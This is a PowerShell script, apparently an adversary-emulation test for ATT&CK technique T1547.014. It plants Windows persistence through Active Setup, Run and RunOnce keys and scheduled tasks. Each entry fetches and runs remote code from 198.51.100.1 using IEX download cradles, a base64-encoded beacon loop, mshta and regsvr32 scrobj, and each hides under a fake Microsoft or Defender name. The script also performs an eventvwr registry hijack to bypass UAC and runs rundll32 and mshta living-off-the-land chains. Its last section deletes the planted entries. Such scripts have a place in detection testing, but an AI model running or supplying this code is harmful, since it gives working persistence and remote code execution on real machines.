Write-Host "[T1547.014] Active Setup + Run Key Persistence" -ForegroundColor Red

$guid = "{$([guid]::NewGuid())}"

Write-Host "[1] Active Setup HKCU (no admin needed)..."
$asKey = "HKCU:\Software\Microsoft\Active Setup\Installed Components\$guid"
New-Item -Path $asKey -Force | Out-Null
New-ItemProperty -Path $asKey -Name "(Default)" -Value "Windows Security Update" -Force | Out-Null
New-ItemProperty -Path $asKey -Name "StubPath" -Value "cmd.exe /c powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/implant.ps1')" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $asKey -Name "Version" -Value "1,0,0,0" -PropertyType String -Force | Out-Null
Write-Host "[+] Active Setup written: $asKey" -ForegroundColor Yellow

Write-Host "[2] HKCU Run key..."
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$encCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("while(`$true){try{IEX(IWR http://198.51.100.1/c2 -UseBasicParsing)}catch{};Start-Sleep 300}"))
New-ItemProperty -Path $runKey -Name "WindowsDefenderHealth" -Value "powershell.exe -ep bypass -w hidden -nop -enc $encCmd" -PropertyType String -Force | Out-Null
Write-Host "[+] Run key written: WindowsDefenderHealth" -ForegroundColor Yellow

Write-Host "[3] HKCU RunOnce with mshta..."
$runOnce = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
New-ItemProperty -Path $runOnce -Name "SecurityPatch" -Value "mshta.exe http://198.51.100.1/payload.hta" -PropertyType String -Force | Out-Null
Write-Host "[+] RunOnce written: SecurityPatch (mshta)" -ForegroundColor Yellow

Write-Host "[4] Scheduled task persistence..."
& schtasks.exe /create /tn "MicrosoftEdgeUpdateCore" /tr "powershell.exe -ep bypass -w hidden -c IEX(IWR http://198.51.100.1/beacon -UseBasicParsing)" /sc onlogon /f 2>&1
& schtasks.exe /create /tn "OneDriveSyncHealth" /tr "mshta.exe http://198.51.100.1/stage2.hta" /sc daily /st 09:00 /f 2>&1

Write-Host "[5] Registry shell command hijack..."
$shellKey = "HKCU:\Software\Classes\mscfile\shell\open\command"
New-Item -Path $shellKey -Force | Out-Null
New-ItemProperty -Path $shellKey -Name "(Default)" -Value "cmd.exe /c powershell.exe -ep bypass -c whoami > $env:TEMP\eventvwr.txt" -Force | Out-Null
& eventvwr.exe 2>&1
Start-Sleep -Seconds 2

Write-Host "[6] LOLBin execution chain..."
& mshta.exe "about:<hta:application><script>new ActiveXObject('WScript.Shell').Run('calc.exe');close();</script>" 2>&1
& regsvr32.exe /s /n /u /i:http://198.51.100.1/scrobj.sct scrobj.dll 2>&1
& rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('calc')" ) 2>&1

Write-Host "[*] Cleanup..."
Remove-Item $asKey -Recurse -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $runKey -Name "WindowsDefenderHealth" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $runOnce -Name "SecurityPatch" -Force -ErrorAction SilentlyContinue
Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
& schtasks.exe /delete /tn "MicrosoftEdgeUpdateCore" /f 2>&1 | Out-Null
& schtasks.exe /delete /tn "OneDriveSyncHealth" /f 2>&1 | Out-Null
Remove-Item "$env:TEMP\eventvwr.txt" -Force -ErrorAction SilentlyContinue

Write-Host "[T1547.014] Done." -ForegroundColor Cyan
